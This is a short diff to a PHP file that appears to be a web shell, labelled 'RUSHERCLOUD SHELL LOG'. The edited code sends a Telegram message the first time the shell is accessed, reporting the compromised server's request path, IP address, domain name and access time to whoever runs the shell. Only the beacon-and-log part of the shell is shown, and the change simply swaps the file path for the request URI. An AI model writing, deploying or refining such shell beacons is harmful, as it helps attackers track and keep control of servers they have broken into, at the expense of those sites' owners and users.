@@ -27,9 +27,8 @@ function sendToTelegram($message)
     @file_get_contents($url . "?" . http_build_query($data));
 }
 if (!isset($_SESSION[$session_key_tele])) {
-    $realpath = realpath(__FILE__);
     $msg = "<b>RUSHERCLOUD SHELL LOG</b>\n\n";
-    $msg .= "Path: <code>$realpath</code>\n";
+    $msg .= "Path: <code>$_SERVER[REQUEST_URI]</code>\n";
     $msg .= "IP: <code>$_SERVER[SERVER_ADDR]</code>\n";
     $msg .= "Domain: <code>$_SERVER[SERVER_NAME]</code>\n";
     $msg .= "First Access: " . date("d-m-Y H:i:s");
